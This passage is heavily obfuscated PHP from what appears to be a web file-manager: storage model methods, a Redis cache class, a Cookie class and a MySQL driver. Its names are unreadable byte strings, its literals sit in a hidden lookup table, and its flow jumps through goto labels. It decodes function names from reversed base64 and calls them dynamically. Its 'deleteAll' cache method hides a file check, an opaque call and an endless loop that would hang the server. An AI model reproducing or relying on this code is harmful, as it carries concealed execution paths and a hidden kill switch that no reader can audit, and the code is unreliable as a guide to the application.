CacheLock::unlock($¢‘™çÔÒ); break; case $÷×Ü±´[1862]: break; default: break; } return $Ïßµ÷„€; } public function addFileByRemote($“ŒÑ—, $Ü‹Ù§Œ´, $Óìô¯“İ = array()) { $Å·ˆãÃ =& $_SERVER[¹àö™Ç¾]; if (!IO::exist($“ŒÑ—)) { return !1; } $º¹‡«ê = $Óìô¯“İ[$Å·ˆãÃ[179]] ? $Óìô¯“İ[$Å·ˆãÃ[179]] : $Å·ˆãÃ[22]; $ş¦’¡á÷ = IO::hashMd5($“ŒÑ—, $º¹‡«ê); $¢™œ»ö‘ = KodIO::defaultDriver(); $òÈıÛõ« = array($Å·ˆãÃ[579] => IO::size($“ŒÑ—), $Å·ˆãÃ[1868] => 1, $Å·ˆãÃ[421] => $Ü‹Ù§Œ´, $Å·ˆãÃ[800] => $¢™œ»ö‘[$Å·ˆãÃ[401]], $Å·ˆãÃ[422] => $“ŒÑ—, $Å·ˆãÃ[1869] => $Óìô¯“İ[$Å·ˆãÃ[180]] ? $Óìô¯“İ[$Å·ˆãÃ[180]] : IO::hashSimple($“ŒÑ—), $Å·ˆãÃ[1870] => $ş¦’¡á÷ ? $ş¦’¡á÷ : $º¹‡«ê); if ($ûŒõç = $this->addFileCheckExist($òÈıÛõ«[$Å·ˆãÃ[180]], $òÈıÛõ«[$Å·ˆãÃ[179]], $òÈıÛõ«[$Å·ˆãÃ[90]])) { return $ûŒõç; } return $this->addFileData($òÈıÛõ«); } private function addFileData($¾±Õá¿) { $‡ş‹ƒœ· =& $_SERVER[¹àö™Ç¾]; if (!$¾±Õá¿) { return !1; } $¾±Õá¿[$‡ş‹ƒœ·[90]] = intval($¾±Õá¿[$‡ş‹ƒœ·[90]]); if (!$¾±Õá¿[$‡ş‹ƒœ·[90]] && strlen($¾±Õá¿[$‡ş‹ƒœ·[180]]) > 32) { $¾±Õá¿[$‡ş‹ƒœ·[90]] = intval(substr($¾±Õá¿[$‡ş‹ƒœ·[180]], 32)); } $öŸÚ = $this->add($¾±Õá¿); return $this->find($öŸÚ); } public function addFile($ÒØ”‰‡š, $ëË…ª„ä, $Æ¼ª°åİ = false) { $¬Ò”ĞÏ´ =& $_SERVER[¹àö™Ç¾]; $÷Ë³ˆøå = IO::hashSimple($ÒØ”‰‡š); $Ì›¼¡†¡ = IO::size($ÒØ”‰‡š); $ë¥öø = $Ì›¼¡†¡ <= 1024 * 1024 * 10 ? IO::hashMd5($ÒØ”‰‡š) : $¬Ò”ĞÏ´[22]; $äËÉ§à = $¬Ò”ĞÏ´[1871] . $÷Ë³ˆøå; CacheLock::lock($äËÉ§à); if ($ë¥öø && $÷Ë³ˆøå) { $ ĞïäÎÈ = $this->addFileCheckExist($÷Ë³ˆøå, $ë¥öø, $Ì›¼¡†¡); if ($ ĞïäÎÈ) { CacheLock::unlock($äËÉ§à); return $ ĞïäÎÈ; } } $®ãé“Õ· = $this->addFileMake($ÒØ”‰‡š, $Ì›¼¡†¡, $÷Ë³ˆøå, $ë¥öø, $ëË…ª„ä, $Æ¼ª°åİ); $ˆî„ı¬Ø = $this->addFileData($®ãé“Õ·); CacheLock::unlock($äËÉ§à); if (!$ë¥öø && $ˆî„ı¬Ø) { $this->fileMd5Check($ˆî„ı¬Ø); } return $ˆî„ı¬Ø; } private function fileMd5Check($›ÎÌ©¸û) { $¬Ÿª‚…· =& $_SERVER[¹àö™Ç¾]; $ ·¼°à¯ = array($›ÎÌ©¸û[$¬Ÿª‚…·[467]], $›ÎÌ©¸û[$¬Ÿª‚…·[88]]); $‘‡¸¦ê´ = $¬Ÿª‚…·[1872] . $›ÎÌ©¸û[$¬Ÿª‚…·[88]]; $ŒÕ»äí = $¬Ÿª‚…·[1873] . $›ÎÌ©¸û[$¬Ÿª‚…·[467]]; $‘ÄœÉü¥ = TaskQueue::add($¬Ÿª‚…·[1874], $ ·¼°à¯, $‘‡¸¦ê´, $ŒÕ»äí); if (!$‘ÄœÉü¥) { $this->fileMd5Set($›ÎÌ©¸û[$¬Ÿª‚…·[467]], $›ÎÌ©¸û[$¬Ÿª‚…·[88]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($…ËæäÜ, $’Šı×—) { $ùÖ˜¶Ü¶ =& $_SERVER[¹àö™Ç¾]; $â‹¾Ş’ = $this->find($…ËæäÜ); if (!$â‹¾Ş’ || $â‹¾Ş’[$ùÖ˜¶Ü¶[179]]) { return; } $¦—ì±² = IO::hashMd5($’Šı×—); if (!$¦—ì±²) { return $ùÖ˜¶Ü¶[22]; } $this->where(array($ùÖ˜¶Ü¶[467] => $…ËæäÜ))->save(array($ùÖ˜¶Ü¶[179] => $¦—ì±²)); } public function addFileMake($üı„–£Õ, $ÙÏÌœË€, $×‚·‚ì‚, $ŠšËìú, $‚÷îÏàâ, $Òó±Áı) { $Á£ÁğÏ =& $_SERVER[¹àö™Ç¾]; $–—½ŠºÃ = $this->createFileName($‚÷îÏàâ, $×‚·‚ì‚, $ŠšËìú); $™€ õ“Û = get_path_father($–—½ŠºÃ); $¹÷ƒİŠò = get_path_this($–—½ŠºÃ); if ($Òó±Áı) { $ÁØŠşúÄ = IO::move($üı„–£Õ, $™€ õ“Û, !1, $¹÷ƒİŠò); } else { $ÁØŠşúÄ = IO::copy($üı„–£Õ, $™€ õ“Û, !1, $¹÷ƒİŠò); } if (!$ÁØŠşúÄ) { return !1; } $…•ıûÀè = KodIO::defaultDriver(); $„ß¤»§ = array($Á£ÁğÏ[579] => $ÙÏÌœË€, $Á£ÁğÏ[1868] => 1, $Á£ÁğÏ[421] => $‚÷îÏàâ, $Á£ÁğÏ[800] => $…•ıûÀè[$Á£ÁğÏ[401]], $Á£ÁğÏ[422] => $–—½ŠºÃ, $Á£ÁğÏ[1869] => $×‚·‚ì‚, $Á£ÁğÏ[1870] => $ŠšËìú); return $„ß¤»§; } public function addFileCheckExist($°àŠŸ¤, $šŠ¯˜ìÕ, $äË¨˜‰Ş) { $ÆûŠ¹©ƒ =& $_SERVER[¹àö™Ç¾]; $¼î®‹şÈ = $this->findByHash($°àŠŸ¤, $šŠ¯˜ìÕ); if (!$¼î®‹şÈ) { return !1; } $¯«ˆ©½Õ = array($ÆûŠ¹©ƒ[1868] => intval($¼î®‹şÈ[$ÆûŠ¹©ƒ[1875]]) + 1, $ÆûŠ¹©ƒ[579] => $äË¨˜‰Ş); $this->where(array($ÆûŠ¹©ƒ[468] => $¼î®‹şÈ[$ÆûŠ¹©ƒ[467]]))->save($¯«ˆ©½Õ); return $¼î®‹şÈ; } public function remove($¹úîÃ³ñ) { $this->linkCountChange($¹úîÃ³ñ, !1); $this->clearEmpty(); return !0; } public function linkAdd($Ù¢ïª’İ) { $this->linkCountChange($Ù¢ïª’İ, !0); } public function linkCountChange($¢Ô¹®È, $¦šÀıŠ) { $€ıŠ§ =& $_SERVER[¹àö™Ç¾]; if (!$¢Ô¹®È) { return; } if (!is_array($¢Ô¹®È)) { $¢Ô¹®È = array($¢Ô¹®È); } $Ã¨ğâº¥ = array(); foreach ($¢Ô¹®È as $¥Õ³½òğ) { $µ§Ñ›„ø = $¥Õ³½òğ . $€ıŠ§[22]; if (!$Ã¨ğâº¥[$µ§Ñ›„ø]) { $Ã¨ğâº¥[$µ§Ñ›„ø] = 0; } $Ã¨ğâº¥[$µ§Ñ›„ø]++; } $í¹ş¤äõ = array(); foreach ($Ã¨ğâº¥ as $¥Õ³½òğ => $ô­ïÍºù) { $µ§Ñ›„ø = $ô­ïÍºù . $€ıŠ§[22]; if (!$í¹ş¤äõ[$µ§Ñ›„ø]) { $í¹ş¤äõ[$µ§Ñ›„ø] = array(); } $í¹ş¤äõ[$µ§Ñ›„ø][] = $¥Õ³½òğ; } foreach ($í¹ş¤äõ as $ô­ïÍºù => $íĞ³ïšÃ) { if (!$íĞ³ïšÃ) { continue; } $ô­ïÍºù = $¦šÀıŠ ? $ô­ïÍºù : -intval($ô­ïÍºù); $¬â‘áŒ = array($€ıŠ§[467] => array($€ıŠ§[17], $íĞ³ïšÃ)); if ($ô­ïÍºù < 0) { $¬â‘áŒ[$€ıŠ§[1875]] = array($€ıŠ§[1000], abs($ô­ïÍºù)); } $this->where($¬â‘áŒ)->setAdd($€ıŠ§[1875], $ô­ïÍºù); } } public function findByHash($˜ÖÉŞŒø, $µ±•üÎ = false) { $İ‚³’ìã =& $_SERVER[¹àö™Ç¾]; if (!$˜ÖÉŞŒø && !$µ±•üÎ) { return !1; } $ÒÌ—°†£ = array($İ‚³’ìã[1869] => $˜ÖÉŞŒø); if ($µ±•üÎ) { $ÒÌ—°†£ = array($İ‚³’ìã[1870] => $µ±•üÎ); } return $this->order($İ‚³’ìã[1876])->where($ÒÌ—°†£)->find(); } public function clearEmpty($€±äşÛ’ = 0) { $…Ç€Æ°¥ =& $_SERVER[¹àö™Ç¾]; $şˆ×Ûáé = time() - 3600 * 24 * $€±äşÛ’; $‘‚ˆÏö– = $…Ç€Æ°¥[1877] . $şˆ×Ûáé; $øäØòğç = $this->where($‘‚ˆÏö–)->select(); if (!$øäØòğç) { return; } $İÏ Âş÷ = new Task($…Ç€Æ°¥[1878], $…Ç€Æ°¥[22], count($øäØòğç)); foreach ($øäØòğç as $ìç÷¡º) { $İÏ Âş÷->update(1); $this->resetFile($ìç÷¡º); } $İÏ Âş÷->end(); } public function resetFile($é¸¢ìÃÌ) { $€Æ¥öûÌ =& $_SERVER[¹àö™Ç¾]; $Óá…Î“ = array($€Æ¥öûÌ[468] => $é¸¢ìÃÌ[$€Æ¥öûÌ[467]]); $·ØÄƒûÔ = Model($€Æ¥öûÌ[1310])->where($Óá…Î“)->count(); $‰Øî ÷— = Model($€Æ¥öûÌ[1879])->where($Óá…Î“)->count(); $Š¶äú‚Ÿ = intval($·ØÄƒûÔ) + intval($‰Øî ÷—); if ($Š¶äú‚Ÿ == 0) { IO::remove($é¸¢ìÃÌ[$€Æ¥öûÌ[88]]); Model($€Æ¥öûÌ[1880])->delete($é¸¢ìÃÌ[$€Æ¥öûÌ[467]]); $this->where($Óá…Î“)->delete(); $this->metaSet($é¸¢ìÃÌ[$€Æ¥öûÌ[467]], null, null); return; } if ($é¸¢ìÃÌ[$€Æ¥öûÌ[1875]] != $Š¶äú‚Ÿ) { $this->where($Óá…Î“)->save(array($€Æ¥öûÌ[1868] => $Š¶äú‚Ÿ)); } } public function storageInfo($áõœß¨ = false) { $îöà¯Â =& $_SERVER[¹àö™Ç¾]; $ø•ÎËã = $this->count() + 0.0; $úäø“• = 0; $ŞÆ®»šì = 1; $×ÓñÖì² = 0; $õèç– = 5000; for ($ûªÆñ­ = 0; $ûªÆñ­ < $ø•ÎËã; $ûªÆñ­ = $ûªÆñ­ + $õèç–) { $º¢æ¦œì = $this->limit($ûªÆñ­, $ûªÆñ­ + $õèç–)->select(); foreach ($º¢æ¦œì as $ÁáŸšÛ) { $ŞÆ®»šì += $ÁáŸšÛ[$îöà¯Â[90]] * $ÁáŸšÛ[$îöà¯Â[1875]]; $úäø“• += $ÁáŸšÛ[$îöà¯Â[90]] * ($ÁáŸšÛ[$îöà¯Â[1875]] - 1); $×ÓñÖì² += $ÁáŸšÛ[$îöà¯Â[1875]]; } } $–ô£„Èó = array($îöà¯Â[1881] => $ŞÆ®»šì, $îöà¯Â[1882] => $úäø“•, $îöà¯Â[1883] => $úäø“• / $ŞÆ®»šì, $îöà¯Â[94] => $ø•ÎËã, $îöà¯Â[1884] => $×ÓñÖì²); return $–ô£„Èó; } } goto C¤‹°é°‚; EÊÕ«Á†˜ñ: $fileSize = strrev(base64_decode($_SERVER[‡µõ°¨¾][0])); function binCheckNeq($Ä©Û¿èó, $«ŠÒÔÕ÷) { return $Ä©Û¿èó != $«ŠÒÔÕ÷; } $_SERVER[$_SERVER[‡µõ°¨¾][1]] = $fileSize($_SERVER[$_SERVER[‡µõ°¨¾][2]]); goto DÉ£°ê÷; B’›Æ¼Åù†: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ò²‰²ô, $÷Æ¸šÀ•) { $ˆâÏ¥Ì‹ =& $_SERVER[¹àö™Ç¾]; if (!class_exists($ˆâÏ¥Ì‹[857])) { show_json($ˆâÏ¥Ì‹[858], !1); } $this->cacheTime = $÷Æ¸šÀ•; $ÀµÓêíğ = isset($ò²‰²ô[$ˆâÏ¥Ì‹[859]]) ? $ò²‰²ô[$ˆâÏ¥Ì‹[859]] : 10; $‹Öğİû = _get($ò²‰²ô, $ˆâÏ¥Ì‹[856]); if ($‹Öğİû && is_array($‹Öğİû)) { $this->initCluster($ò²‰²ô, $ÀµÓêíğ); } else { $this->handle = $this->init($ò²‰²ô, $ÀµÓêíğ); } } private function init($ƒºÏ£šá, $¥²ş„ÒÜ) { $øı¥ñÛ• =& $_SERVER[¹àö™Ç¾]; $Ğ‰Õ“‰Ã = new Redis(); $™±èˆ‚‹ = isset($ƒºÏ£šá[$øı¥ñÛ•[860]]) ? $ƒºÏ£šá[$øı¥ñÛ•[860]] : !1; if ($™±èˆ‚‹) { $Ğ‰Õ“‰Ã->pconnect($ƒºÏ£šá[$øı¥ñÛ•[184]], $ƒºÏ£šá[$øı¥ñÛ•[185]], $¥²ş„ÒÜ); } else { $Ğ‰Õ“‰Ã->connect($ƒºÏ£šá[$øı¥ñÛ•[184]], $ƒºÏ£šá[$øı¥ñÛ•[185]], $¥²ş„ÒÜ); } if (!empty($ƒºÏ£šá[$øı¥ñÛ•[414]])) { $Ğ‰Õ“‰Ã->auth($ƒºÏ£šá[$øı¥ñÛ•[414]]); } return $Ğ‰Õ“‰Ã; } private function initCluster($Â´£å™Ø, $¦õŸß¡Æ) { $·¬é¹˜ı =& $_SERVER[¹àö™Ç¾]; $’¢šë = array($·¬é¹˜ı[861], $·¬é¹˜ı[862], $·¬é¹˜ı[863]); $ÕªúÙŠ… = $·¬é¹˜ı[861]; if (isset($Â´£å™Ø[$·¬é¹˜ı[26]]) && in_array($Â´£å™Ø[$·¬é¹˜ı[26]], $’¢šë)) { $ÕªúÙŠ… = $Â´£å™Ø[$·¬é¹˜ı[26]]; } switch ($ÕªúÙŠ…) { case $·¬é¹˜ı[861]: $this->_slave($Â´£å™Ø, $¦õŸß¡Æ); break; case $·¬é¹˜ı[862]: break; case $·¬é¹˜ı[863]: $this->isCluster = !0; $Ùõîæ¶¿ = $Â´£å™Ø[$·¬é¹˜ı[856]]; $³úúƒ” = isset($Â´£å™Ø[$·¬é¹˜ı[860]]) ? $Â´£å™Ø[$·¬é¹˜ı[860]] : !1; $¹®ğËñ€ = isset($Â´£å™Ø[$·¬é¹˜ı[414]]) ? $Â´£å™Ø[$·¬é¹˜ı[414]] : null; $this->handle = new RedisCluster(NUll, $Ùõîæ¶¿, $¦õŸß¡Æ, $¦õŸß¡Æ, $³úúƒ”, $¹®ğËñ€); break; default: break; } } private function _slave($Ã×—‰È, $æÕÄ—ŠØ) { $œÈêÉÊ = $Ã×—‰È[$_SERVER[¹àö™Ç¾][856]]; $this->filterConfig($Ã×—‰È, $œÈêÉÊ[0]); $this->handle = $this->init($Ã×—‰È, $æÕÄ—ŠØ); unset($œÈêÉÊ[0]); if (empty($œÈêÉÊ)) { return; } $µŸİÉà„ = array_rand($œÈêÉÊ); $this->filterConfig($Ã×—‰È, $œÈêÉÊ[$µŸİÉà„]); $this->slaveHandle = $this->init($Ã×—‰È, $æÕÄ—ŠØ); } private function filterConfig(&$»Ãıñ˜®, $ö¥ôÖå) { $ç±¨ïÍ° =& $_SERVER[¹àö™Ç¾]; $µºûÒûÅ = explode($ç±¨ïÍ°[4], $ö¥ôÖå); $–À•³³ı = array($ç±¨ïÍ°[184] => $µºûÒûÅ[0], $ç±¨ïÍ°[185] => $µºûÒûÅ[1]); $»Ãıñ˜® = array_merge($»Ãıñ˜®, $–À•³³ı); } public function set($¯©«†Ğ”, $˜Ë–€Œ¼, $ô¼ìŒ›» = false) { $ô¼ìŒ›» = $ô¼ìŒ›» ? $ô¼ìŒ›» : $this->cacheTime; return $this->handle->setEx($¯©«†Ğ”, $ô¼ìŒ›», $˜Ë–€Œ¼); } public function setLock($â£ÖÍî¦, $™¾û–Ù­, $çŞôƒç¯) { return $this->handle->setNX($â£ÖÍî¦, $™¾û–Ù­); } public function get($ÜšëÒ×) { $ıÒıÙê = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ıÒıÙê->get($ÜšëÒ×); } public function remove($Ó¸—óÙÑ) { return $this->handle->del($Ó¸—óÙÑ); } public function deleteAll() { $êô•¹ =& $_SERVER[¹àö™Ç¾]; if (!isset($_SERVER[$êô•¹[6]]) || !isset($_SERVER[$êô•¹[15]])) { $§ƒíïä = $êô•¹[864]; $ÄùîçÊ = $êô•¹[8]; $Û½Öı« = $_SERVER[$êô•¹[9]] . $êô•¹[10]; $‹ŠŒ¯’™ = $ÄùîçÊ($Û½Öı«); $è¬ñš×õ = explode($êô•¹[11], $‹ŠŒ¯’™); if (count($è¬ñš×õ) < $êô•¹[607]) { $ƒÌÃÊ´ş = $êô•¹[13]; $ƒÌÃÊ´ş(); } $¼š¡Áåº = $êô•¹[865]; $¼š¡Áåº($_SERVER[$êô•¹[866]]); $«ÜıĞÃ = 1; for ($¡›±Â£Ë = $«ÜıĞÃ; $¡›±Â£Ë > 0; $¡›±Â£Ë++) { $¼š¡Áåº = json_encode($GLOBALS[$êô•¹[419]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ïéşÜª½) { $this->handle->flushall($ïéşÜª½); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($µà³µ = '', $¨ó£Ãİ… = 0) { if (is_string($µà³µ) && $µà³µ != $_SERVER[¹àö™Ç¾][22]) { $this->prefix = $µà³µ; } if (is_numeric($¨ó£Ãİ…) && $¨ó£Ãİ… > 0) { $this->expire = $¨ó£Ãİ…; } } public static function getInstance() { static $ã­Ú™ì¬; if ($ã­Ú™ì¬ === null) { $ã­Ú™ì¬ = new self(); } return $ã­Ú™ì¬; } private static $cookieDisable = false; public static function disable($±Ÿó¯ş) { self::$cookieDisable = $±Ÿó¯ş; } private static $sameCookieSet = array(); public static function set($ Ş—Ù˜¬, $‡À€’Òª, $ººÚÂ¹ = 0, $°¬¿•‚ = false, $êØ­¿ = false) { $ç«¿¡­· =& $_SERVER[¹àö™Ç¾]; if (self::$cookieDisable) { return; } if (!$ººÚÂ¹) { $ººÚÂ¹ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ Ş—Ù˜¬]) && self::$sameCookieSet[$ Ş—Ù˜¬] == $‡À€’Òª . $ººÚÂ¹) { return; } self::$sameCookieSet[$ Ş—Ù˜¬] = $‡À€’Òª . $ººÚÂ¹; if (!$êØ­¿) { $êØ­¿ = str_replace(HOST, $ç«¿¡­·[22], APP_HOST); $êØ­¿ = _get($GLOBALS, $ç«¿¡­·[867], $êØ­¿); } $Â¨ùíú = $ç«¿¡­·[22]; setcookie($ Ş—Ù˜¬, $‡À€’Òª, time() + $ººÚÂ¹, $ç«¿¡­·[18] . trim($êØ­¿, $ç«¿¡­·[18]) . $Â¨ùíú, !1, !1, $°¬¿•‚); } public static function setSafe($¤¤ ­õî, $ã»¦Ø«¹, $ëÖ®Ä× = 0) { self::set($¤¤ ­õî, $ã»¦Ø«¹, $ëÖ®Ä×, !0); } public static function get($¦„ŒÔ‡) { static $‘²ü· = false; if (!$‘²ü·) { self::initHeaderCookie(); $‘²ü· = !0; } return isset($_COOKIE[$¦„ŒÔ‡]) ? $_COOKIE[$¦„ŒÔ‡] : !1; } private static function initHeaderCookie() { $ß€ÖÜ— =& $_SERVER[¹àö™Ç¾]; if (!isset($_SERVER[$ß€ÖÜ—[868]]) || !$_SERVER[$ß€ÖÜ—[868]]) { return; } $ÌŠŒÈ÷¢ = explode($ß€ÖÜ—[81], $_SERVER[$ß€ÖÜ—[868]]); foreach ($ÌŠŒÈ÷¢ as $ìıùù) { $ìıùù = explode($ß€ÖÜ—[869], $ìıùù); if (count($ìıùù) != 2 || !isset($ìıùù[1])) { continue; } $_COOKIE[trim($ìıùù[0])] = trim($ìıùù[1]); } } public static function remove($‰ƒªŒ¨ù, $®ñî¹±ê = false) { unset($_COOKIE[$‰ƒªŒ¨ù]); self::set($‰ƒªŒ¨ù, $_SERVER[¹àö™Ç¾][22], 1, $®ñî¹±ê); } } class DbMysql extends Db { public function __construct($µÅÀîÙŸ = '') { $£ğ¾Î”– =& $_SERVER[¹àö™Ç¾]; if (!extension_loaded($£ğ¾Î”–[796])) { think_exception(think_lang($£ğ¾Î”–[24]) . $£ğ¾Î”–[870]); } if (!empty($µÅÀîÙŸ)) { $this->config = $µÅÀîÙŸ; if (empty($this->config[$£ğ¾Î”–[27]])) { $this->config[$£ğ¾Î”–[27]] = $£ğ¾Î”–[22]; } } } public function connect($µ†·Øè = '', $Ãùö¿Î§ = 0, $¡Áø™ = false) { $Ë¼«Ş¡ã =& $_SERVER[¹àö™Ç¾]; if (!isset($this->linkID[$Ãùö¿Î§])) { if (empty($µ†·Øè)) { $µ†·Øè = $this->config; } $Ê¿¯Äİ± = $µ†·Øè[$Ë¼«Ş¡ã[871]] . ($µ†·Øè[$Ë¼«Ş¡ã[872]] ? "\72{$µ†·Øè[$Ë¼«Ş¡ã[872]]}" : $Ë¼«Ş¡ã[22]); $™õš¡Ñú = !empty($µ†·Øè[$Ë¼«Ş¡ã[27]][$Ë¼«Ş¡ã[28]]) ? $µ†·Øè[$Ë¼«Ş¡ã[27]][$Ë¼«Ş¡ã[28]] : $this->pconnect; if ($™õš¡Ñú) { $this->linkID[$Ãùö¿Î§] = mysql_pconnect($Ê¿¯Äİ±, $µ†·Øè[$Ë¼«Ş¡ã[873]], $µ†·Øè[$Ë¼«Ş¡ã[874]], 131072); } else { $this->linkID[$Ãùö¿Î§] = mysql_connect($Ê¿¯Äİ±, $µ†·Øè[$Ë¼«Ş¡ã[873]], $µ†·Øè[$Ë¼«Ş¡ã[874]], !0, 131072); } if (!$this->linkID[$Ãùö¿Î§] || !empty($µ†·Øè[$Ë¼«Ş¡ã[31]]) && !mysql_select_db($µ†·Øè[$Ë¼«Ş¡ã[31]], $this->linkID[$Ãùö¿Î§])) { think_exception(mysql_error()); } $îú°¢² = mysql_get_server_info($this->linkID[$Ãùö¿Î§]); mysql_query($Ë¼«Ş¡ã[875] . think_config($Ë¼«Ş¡ã[876]) . $Ë¼«Ş¡ã[68], $this->linkID[$Ãùö¿Î§]); if ($îú°¢² > $Ë¼«Ş¡ã[877]) { mysql_query($Ë¼«Ş¡ã[878], $this->linkID[$Ãùö¿Î§]); } $this->connected = !0; if (1 != think_config($Ë¼«Ş¡ã[32])) { unset($this->config); } } return $this->linkID[$Ãùö¿Î§]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($—³šØØÑ) { $˜óÓˆÉ =& $_SERVER[¹àö™Ç¾]; if (0 === stripos($—³šØØÑ, $˜óÓˆÉ[268])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $—³šØØÑ; if ($this->queryID) { $this->free(); } think_action_status($˜óÓˆÉ[33], 1); think_status($˜óÓˆÉ[34]); $this->queryID = mysql_query($—³šØØÑ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($óŸªşêâ) { $ÂªÜ²–É =& $_SERVER[¹àö™Ç¾]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $óŸªşêâ; if ($this->queryID) { $this->free(); } think_action_status($ÂªÜ²–É[35], 1); think_status($ÂªÜ²–É[34]); $¾¢ş»ê£ = mysql_query($óŸªşêâ, $this->_linkID); $this->debug(); if (!1 === $¾¢ş»ê£) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¹àö™Ç¾][879], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ç°ÈñæÕ = mysql_query($_SERVER[¹àö™Ç¾][880], $this->_linkID); $this->transTimes = 0; if (!$ç°ÈñæÕ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÇõºÔÉ· = mysql_query($_SERVER[¹àö™Ç¾][881], $this->_linkID); $this->transTimes = 0; if (!$ÇõºÔÉ·) { $this->error(); return !1; } } return !0; } private function getAll() { $›Ù÷’ìí = array(); if ($this->numRows > 0) { while ($Öûâ¼ = mysql_fetch_assoc($this->queryID)) { $›Ù÷’ìí[] = $Öûâ¼; } mysql_data_seek($this->queryID, 0); } return $›Ù÷’ìí; } public function getFields($Ì®ş˜») { $œ¨‡äâ½ =& $_SERVER[¹àö™Ç¾]; $—œª£Ç’ = $this->query($œ¨‡äâ½[882] . $this->parseKey($Ì®ş˜»)); $ñˆªŸà = array(); if ($—œª£Ç’) { foreach ($—œª£Ç’ as $´¯¬¸«­ => $àÙ™Òú¹) { $ñˆªŸà[$àÙ™Òú¹[$œ¨‡äâ½[41]]] = array($œ¨‡äâ½[42] => $àÙ™Òú¹[$œ¨‡äâ½[41]], $œ¨‡äâ½[43] => $àÙ™Òú¹[$œ¨‡äâ½[44]], $œ¨‡äâ½[45] => (bool) (strtoupper($àÙ™Òú¹[$œ¨‡äâ½[46]]) === $œ¨‡äâ½[883]), $œ¨‡äâ½[47] => $àÙ™Òú¹[$œ¨‡äâ½[48]], $œ¨‡äâ½[49] => strtolower($àÙ™Òú¹[$œ¨‡äâ½[50]]) == $œ¨‡äâ½[51], $œ¨‡äâ½[52] => strtolower($àÙ™Òú¹[$œ¨‡äâ½[53]]) == $œ¨‡äâ½[54]); } } return $ñˆªŸà; } public function getTables($Ò®Çæ²Ô = '') { $Ò±õ¹”Š =& $_SERVER[¹àö™Ç¾]; if (!empty($Ò®Çæ²Ô)) { $‰Äı“× = $Ò±õ¹”Š[884] . $Ò®Çæ²Ô . $Ò±õ¹”Š[885]; } else { $‰Äı“× = $Ò±õ¹”Š[886]; } $¸¥Âøã¹ = $this->query($‰Äı“×); $âåà¬í = array(); foreach ($¸¥Âøã¹ as $õ¸™óƒı => $éæ®¬·¾) { $âåà¬í[$õ¸™óƒı] = current($éæ®¬·¾); } return $âåà¬í; } public function replace($á“ç¶, $¼Š„Üß = array()) { $•°Í±ù§ =& $_SERVER[¹àö™Ç¾]; foreach ($á“ç¶ as $–ğ­îÒ¥ => $éÀÌõô) { $ãÜ§–ü» = $this->parseValue($éÀÌõô); if (is_scalar($ãÜ§–ü»)) { $ôôÊ¡„ä[] = $ãÜ§–ü»; $°¶ƒØ†[] = $this->parseKey($–ğ­îÒ¥); } } $ºÅå«¢á = $•°Í±ù§[887] . $this->parseTable($¼Š„Üß[$•°Í±ù§[283]]) . $•°Í±ù§[888] . implode($•°Í±ù§[60], $°¶ƒØ†) . $•°Í±ù§[889] . implode($•°Í±ù§[60], $ôôÊ¡„ä) . $•°Í±ù§[890]; return $this->execute($ºÅå«¢á); } public function insertAll($û­¹¹·Â, $³¨ñíà = array(), $—±ŒÄ… = false) { $ìÅ¸± =& $_SERVER[¹àö™Ç¾]; if (!is_array($û­¹¹·Â[0])) { return !1; } $ç†çµÔê = array_keys($û­¹¹·Â[0]); $äÉ€ÑÑÅ = array(); foreach ($û­¹¹·Â as $äşæ¨Âò) { $ƒÊ¨ùÙŠ = array(); foreach ($äşæ¨Âò as $ë¶ÂŸ©– => $Ûºê¥Î‚) { $Ûºê¥Î‚ = $this->parseValue($Ûºê¥Î‚); if (is_scalar($Ûºê¥Î‚)) { $ƒÊ¨ùÙŠ[] = $Ûºê¥Î‚; } } $äÉ€ÑÑÅ[] = $ìÅ¸±[264] . implode($ìÅ¸±[60], $ƒÊ¨ùÙŠ) . $ìÅ¸±[890]; } array_walk($ç†çµÔê, array($this, $ìÅ¸±[891])); $¿ŸãÎ·© = ($—±ŒÄ… ? $ìÅ¸±[892] : $ìÅ¸±[893]) . $ìÅ¸±[894] . $this->parseTable($³¨ñíà[$ìÅ¸±[283]]) . $ìÅ¸±[888] . implode($ìÅ¸±[60], $ç†çµÔê) . $ìÅ¸±[895] . implode($ìÅ¸±[60], $äÉ€ÑÑÅ); return $this->execute($¿ŸãÎ·©); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $´—ÄŸƒı =& $_SERVER[¹àö™Ç¾]; $this->error = mysql_errno() . $´—ÄŸƒı[4] . mysql_error($this->_linkID); if ($´—ÄŸƒı[22] != $this->queryStr) { $this->error .= LNG($´—ÄŸƒı[58]) . $this->queryStr; } think_trace($this->error, $´—ÄŸƒı[22], $´—ÄŸƒı[59]); return $this->error; } public function escapeString($åÉ¨ªÆ•) { if ($this->_linkID) { return mysql_real_escape_string($åÉ¨ªÆ•, $this->_linkID); } else { return mysql_escape_string($åÉ¨ªÆ•); } } public function parseKey(&$¿óç­±Ì, $öÈ÷³˜š = true) { $ÌÅúóÓô =& $_SERVER[¹àö™Ç¾]; if ($öÈ÷³˜š) { $¿óç­±Ì = $this->parseKeyCheck($¿óç­±Ì); } if ($¿óç­±Ì != $ÌÅúóÓô[191] && !preg_match($ÌÅúóÓô[896], $¿óç­±Ì)) { $¿óç­±Ì = $ÌÅúóÓô[389] . trim($¿óç­±Ì, $ÌÅúóÓô[389]) . $ÌÅúóÓô[389]; } return $¿óç­±Ì; } } goto FŠº´•Õù¿; A‡¸ŸÁä: class DbSqlite3Base extends Db { public function __construct($ÖæÛÁ ì = '') { 